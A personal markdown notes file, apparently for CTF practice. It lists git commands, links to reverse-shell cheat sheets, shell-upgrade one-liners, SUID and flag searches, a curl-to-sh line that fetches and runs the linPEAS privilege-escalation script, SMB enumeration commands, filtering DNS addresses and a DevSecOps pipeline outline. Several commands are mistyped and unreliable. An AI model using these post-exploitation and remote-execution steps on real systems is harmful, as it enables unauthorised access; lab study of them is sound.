# Random
Just a zunk of notes

###  Github command

```bash
git init                                                      
git remote add origin "Paste the link of the github"          
git remote -v                                                 
git add .                                                     
git commit -m "Name of the tool/subjet"                       
git push origin master.
```
### CTF Helper
```bash
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
```
```bash
https://gtfobins.github.io/
```
```bash
https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
```
### Python TTY Shell
```bash
python -c 'import pty; pty.spawn("/bin/sh")' 
```
### Bash Shell
```bash
echo os.system('/bin/bash')
```
### shell-PostExploitation
```bash
find / -perm -u=s -type f 2>/dev/null
```
### To clear terminal after spwanning shell
```bash
export TERM=xterm
```
### Auto-complete fuction after gettting shell
```bash
stty raw - echo ; fg 
```
### Abusing SUID 
```bash
find / -type f -perm -4001 -exec ls -h {} \; 2> /dev/null
```
### Find Flags
```bash
→ find | grep flag 
→ find / -type f -name user.txt
→ find / -type -f name **name of the flag you want**
→ search -f flag*.txt #This will find the name called flag with file extension txt
```
### Quick Linux Privilege Escalataion
```bash
curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
→ chmod +x linpeas.sh 
→ ./linpeas.sh
```
### Enumerating SMB
```bash
enum4linux 192.168.1.40
```
```bash
nmap --script smb-os-discovery IP-Address
```
```bash
smbmap -H IP-Address
```
```bash
smbclient -L IP-Address
smbclient //IP-Address/User-Found-In-Disk
```
```bash
net view \\IP-Address /All
```
### Change DNS for blocking malware and adult content
#### Malware and Adult content
```bash
Primary DNS : 1.1.1.3
Secondary DNS : 1.0.0.3
```
#### Malware Blocking Only
```bash
Primary DNS : 1.1.1.2
Secondary DNS : 1.0.0.2
```
###  𝐖𝐡𝐚𝐭 𝐝𝐨𝐞𝐬 𝐃𝐞𝐯𝐒𝐞𝐜𝐎𝐩𝐬 𝐂𝐈/𝐂𝐃 𝐩𝐢𝐩𝐞𝐥𝐢𝐧𝐞 𝐥𝐨𝐨𝐤 𝐥𝐢𝐤𝐞?

```bash

🔹 1- 𝐏𝐥𝐚𝐧/𝐃𝐞𝐬𝐢𝐠𝐧
1.1 Threat modeling:
1.2 Secure SDLC

🔹2-𝐃𝐞𝐯𝐞𝐥𝐨𝐩
The Development stage starts with writing code and we can use shift-left security best practice which incorporates security thinking in the earliest stages of development.

2.1-Install linting tools inside the code editor like Visual Studio Code. One of the most popular linting tools is SonarLint. Which highlights bugs and security vulnerabilities as you write code.
-Use Pre-commit hooks to prevent adding any secrets to code.
-Setup Protected branch and code reviews process.
-Sign git commit with GPG key.
-Always verify the downloaded binary/file hash.
-Enable 2-factor authentication.

🔹3-𝐁𝐮𝐢𝐥𝐝 𝐚𝐧𝐝 𝐂𝐨𝐝𝐞 𝐚𝐧𝐚𝐥𝐲𝐬𝐢𝐬
3.1 Scan for secrets and credentials
3.2 Software Bill of Materials (SBOM)
3.2.1 Syft with Grype and Trivy
3.2.2 OWASP Dependency-Check
3.3 Static Application Security Testing (SAST)
3.4 Unit test
3.5 Dockerfile static scanning
3.6 Container image scan
3.7 Container image signing and verifying 
3.8 Container image validation test

🔹4-𝐓𝐞𝐬𝐭
4.1 Smoke test
4.2 API testing
4.3 Dynamic application security testing (DAST)

🔹5-𝐃𝐞𝐩𝐥𝐨𝐲
5.1 Static scan of Kubernete manifest file or Helm chart
5.2 Pre-deploy policy check Kubernete manifest YAML file
5.3 kube-bench for CIS scan
5.4 IaC scanning:

🔹6-𝐌𝐨𝐧𝐢𝐭𝐨𝐫 𝐚𝐧𝐝 𝐀𝐥𝐞𝐫𝐭
Monitoring and Alerting
6.1 Metrics monitoring
6.2 Log monitoring
6.3 Alerting
```
